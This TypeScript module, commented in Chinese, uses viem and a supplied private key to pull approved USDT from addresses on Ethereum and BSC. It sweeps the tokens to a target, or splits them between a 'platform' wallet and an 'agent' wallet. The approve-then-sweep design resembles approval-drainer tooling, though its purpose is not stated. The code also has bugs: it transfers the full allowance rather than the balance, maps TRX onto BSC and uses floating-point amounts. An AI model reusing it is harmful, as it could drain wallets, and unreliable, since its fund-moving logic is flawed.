import {
  createPublicClient,
  http,
  createWalletClient as createViemWalletClient,
  type PublicClient,
  type WalletClient,
  type Account,
} from 'viem';
import { mainnet, bsc } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';
import { USDT_CONTRACT_ADDRESSES } from './getBalance';

const USDT_ABI = [
  {
    inputs: [
      { name: 'sender', type: 'address' },
      { name: 'recipient', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    name: 'transferFrom',
    outputs: [{ name: '', type: 'bool' }],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    name: 'approve',
    outputs: [{ name: '', type: 'bool' }],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [{ name: 'account', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
  {
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
];

/**
 * 获取对应网络的USDT合约地址
 * @param network - 网络类型 ('ETH' | 'BSC' | 'TRX')
 * @returns USDT合约地址
 */
export const getUsdtAddress = (
  network: keyof typeof USDT_CONTRACT_ADDRESSES,
): string => {
  return USDT_CONTRACT_ADDRESSES[network];
};

/**
 * 执行USDT转账交易
 * @param client - 钱包客户端实例
 * @param usdtAddress - USDT合约地址
 * @param sender - 发送方地址
 * @param recipient - 接收方地址
 * @param amount - 转账金额
 * @param account - 账户实例
 * @returns 交易哈希
 */
const transferFrom = async (
  client: any,
  usdtAddress: string,
  sender: string,
  recipient: string,
  amount: bigint,
  account: Account,
): Promise<`0x${string}`> => {
  const hash = await client.writeContract({
    address: usdtAddress as `0x${string}`,
    abi: USDT_ABI,
    functionName: 'transferFrom',
    args: [sender, recipient, amount],
    account: account,
  });

  return hash;
};

/**
 * 创建账户
 * @param secretKey - 私钥
 * @returns 账户实例
 */
const createAccount = (secretKey: `0x${string}`): Account => {
  return privateKeyToAccount(secretKey);
};

/**
 * 等待交易完成
 * @param publicClient - 公共客户端实例
 * @param hash - 交易哈希
 * @returns Promise<void>
 */
const waitForTransaction = async (
  publicClient: PublicClient,
  hash: `0x${string}`,
): Promise<void> => {
  await publicClient.waitForTransactionReceipt({ hash });
};

/**
 * 创建钱包客户端
 * @param account - 账户信息
 * @param network - 网络类型 ('ETH' | 'BSC')
 * @returns 钱包客户端实例
 */
const createWalletClient = (
  account: Account,
  network: 'ETH' | 'BSC' | 'TRX',
): WalletClient => {
  return createViemWalletClient({
    account,
    chain: network === 'ETH' ? mainnet : bsc,
    transport: http(
      network === 'ETH'
        ? 'https://ethereum.publicnode.com'
        : 'https://bsc-dataseed1.binance.org/',
    ),
  });
};

/**
 * 获取代币授权额度
 * @param publicClient - 公共客户端实例
 * @param usdtAddress - USDT代币合约地址
 * @param sender - 授权者地址
 * @param spender - 被授权者地址
 * @returns 授权额度(bigint类型)
 */
const allowance = async (
  publicClient: PublicClient,
  usdtAddress: string,
  sender: string,
  spender: string,
): Promise<bigint> => {
  const allowanceAmount = (await publicClient.readContract({
    address: usdtAddress as `0x${string}`,
    abi: USDT_ABI,
    functionName: 'allowance',
    args: [sender, spender],
  })) as bigint;

  return allowanceAmount;
};

/**
 * 创建公共客户端
 * @param network - 网络类型 ('ETH' | 'BSC')
 * @returns 公共客户端实例
 */
const createPublicClientInstance = (
  network: 'ETH' | 'BSC' | 'TRX',
): PublicClient => {
  return createPublicClient({
    chain: network === 'ETH' ? mainnet : bsc,
    transport: http(
      network === 'ETH'
        ? 'https://ethereum.publicnode.com'
        : 'https://bsc-dataseed1.binance.org/',
    ),
  });
};

/**
 * 执行代币归集操作
 * @param network - 网络类型 ('ETH' | 'BSC')
 * @param fromAddress - 待归集的地址
 * @param toAddress - 归集目标地址
 * @param spenderSecretKey - 授权账户私钥
 * @returns 交易哈希
 */
export const collectTokens = async (
  network: 'ETH' | 'BSC',
  fromAddress: string,
  toAddress: string,
  spenderSecretKey: `0x${string}`,
): Promise<`0x${string}`> => {
  // 创建公共客户端
  const publicClient = createPublicClientInstance(network);

  // 获取USDT合约地址
  const usdtAddress = getUsdtAddress(network);

  // 创建spender账户
  const spenderAccount = createAccount(spenderSecretKey);

  // 创建钱包客户端
  const walletClient = createWalletClient(spenderAccount, network);

  // 检查授权额度
  const currentAllowance = await allowance(
    publicClient,
    usdtAddress,
    fromAddress,
    spenderAccount.address,
  );

  // 如果没有授权，提示用户
  if (currentAllowance === BigInt(0)) {
    throw new Error(`请先授权 ${spenderAccount.address} 地址使用您的USDT`);
  }

  // 获取用户USDT余额
  const balance = await getTokenBalance(publicClient, usdtAddress, fromAddress);

  // 如果授权额度不足，提示用户
  if (currentAllowance < balance) {
    throw new Error(`当前授权额度不足，请增加授权额度`);
  }

  // 执行转账
  const hash = await transferFrom(
    walletClient,
    usdtAddress,
    fromAddress,
    toAddress,
    currentAllowance,
    spenderAccount,
  );

  // 等待交易完成
  await waitForTransaction(publicClient, hash);

  return hash;
};

/**
 * 获取代币余额
 * @param client - 公共客户端实例
 * @param tokenAddress - 代币合约地址
 * @param accountAddress - 要查询的账户地址
 * @returns 代币余额
 */
const getTokenBalance = async (
  client: PublicClient,
  tokenAddress: string,
  accountAddress: string,
): Promise<bigint> => {
  const balance = await client.readContract({
    address: tokenAddress as `0x${string}`,
    abi: USDT_ABI,
    functionName: 'balanceOf',
    args: [accountAddress as `0x${string}`],
  });

  return balance as bigint;
};

/**
 * 执行代币分配操作
 * @param network - 网络类型 ('ETH' | 'BSC')
 * @param sender - 发送方地址
 * @param platformWallet - 平台钱包地址
 * @param agentWallet - 代理钱包地址（可选，代理钱包场景）
 * @param amount - 总金额
 * @param platformPercentage - 平台分配比例
 * @param agentPercentage - 代理分配比例
 * @param spenderSecretKey - 授权账户私钥
 * @param hasAgentWallet - 是否有代理钱包
 * @returns 交易信息
 */
export const distributeTokens = async (
  network: 'ETH' | 'BSC' | 'TRX',
  sender: string,
  platformWallet: string,
  agentWallet: string | undefined,
  amount: string,
  platformPercentage: number,
  agentPercentage: number,
  spenderSecretKey: `0x${string}`,
  hasAgentWallet: boolean,
): Promise<{
  type: 'agent' | 'direct';
  hashes: `0x${string}`[];
  amounts: bigint[];
}> => {
  // 创建账户
  const account = createAccount(spenderSecretKey);

  // 创建公共客户端
  const publicClient = createPublicClientInstance(network);
  // 创建钱包客户端
  const walletClient = createWalletClient(account, network);

  // 获取USDT合约地址
  const usdtAddress = getUsdtAddress(network);

  // 计算总金额（考虑不同网络的精度）
  const totalAmount =
    BigInt(parseFloat(amount) * 1e6) *
    (network === 'ETH' ? BigInt(1) : BigInt(10 ** 12));

  // 检查余额
  const balance = await getTokenBalance(publicClient, usdtAddress, sender);

  if (balance < totalAmount) {
    throw new Error(
      `余额不足，当前余额: ${
        Number(balance) / (network === 'ETH' ? 10 ** 6 : 10 ** 18)
      }, 需要: ${
        Number(totalAmount) / (network === 'ETH' ? 10 ** 6 : 10 ** 18)
      }`,
    );
  }

  // 检查授权额度
  const allowanceAmount = await allowance(
    publicClient,
    usdtAddress,
    sender,
    account.address,
  );

  // 如果没有授权，提示用户
  if (allowanceAmount === BigInt(0)) {
    throw new Error(`请先授权 ${account.address} 地址使用您的USDT`);
  }

  if (allowanceAmount < totalAmount) {
    throw new Error(
      `授权额度不足: 需要 ${totalAmount}, 当前授权额度 ${allowanceAmount}`,
    );
  }

  // 检查账户原生代币余额用于支付gas
  const nativeBalance = await publicClient.getBalance({
    address: account.address,
  });
  if (nativeBalance === BigInt(0)) {
    throw new Error(`账户 ${account.address} 没有足够的原生代币支付gas费用`);
  }

  const hashes: `0x${string}`[] = [];
  const amounts: bigint[] = [];

  try {
    if (hasAgentWallet && agentWallet) {
      // 代理钱包模式：分两笔转账
      console.log(`开始代理钱包模式转账，发送方: ${sender}`);

      const platformAmount =
        BigInt(parseFloat(amount) * platformPercentage * 1e6) *
        (network === 'ETH' ? BigInt(1) : BigInt(10 ** 12));
      const agentAmount =
        BigInt(parseFloat(amount) * agentPercentage * 1e6) *
        (network === 'ETH' ? BigInt(1) : BigInt(10 ** 12));

      console.log(
        `计算金额 - 平台: ${platformAmount}, 代理: ${agentAmount}, 网络: ${network}`,
      );

      // 转账给平台
      console.log(`开始向平台钱包转账: ${platformWallet}`);
      const platformHash = await transferFrom(
        walletClient,
        usdtAddress,
        sender,
        platformWallet,
        platformAmount,
        account,
      );
      console.log(`平台转账交易已提交，哈希: ${platformHash}`);
      await waitForTransaction(publicClient, platformHash);
      console.log(`平台转账交易已确认`);

      // 转账给代理
      console.log(`开始向代理钱包转账: ${agentWallet}`);
      const agentHash = await transferFrom(
        walletClient,
        usdtAddress,
        sender,
        agentWallet,
        agentAmount,
        account,
      );
      console.log(`代理转账交易已提交，哈希: ${agentHash}`);
      await waitForTransaction(publicClient, agentHash);
      console.log(`代理转账交易已确认`);

      hashes.push(platformHash, agentHash);
      amounts.push(platformAmount, agentAmount);

      console.log(`代理钱包模式转账完成，共执行2笔交易`);
      return {
        type: 'agent',
        hashes,
        amounts,
      };
    } else {
      // 直接转账模式：单笔转账给平台
      console.log(
        `开始直接转账模式，发送方: ${sender}, 接收方: ${platformWallet}`,
      );
      console.log(`转账金额: ${totalAmount}, 网络: ${network}`);

      const hash = await transferFrom(
        walletClient,
        usdtAddress,
        sender,
        platformWallet,
        totalAmount,
        account,
      );
      console.log(`直接转账交易已提交，哈希: ${hash}`);
      await waitForTransaction(publicClient, hash);
      console.log(`直接转账交易已确认`);

      hashes.push(hash);
      amounts.push(totalAmount);

      console.log(`直接转账模式完成，执行了1笔交易`);
      return {
        type: 'direct',
        hashes,
        amounts,
      };
    }
  } catch (error: any) {
    // 处理gas不足错误
    if (error.message.includes('insufficient funds for transfer')) {
      throw new Error(`账户 ${account.address} 没有足够的原生代币支付gas费用`);
    }
    throw error;
  }
};
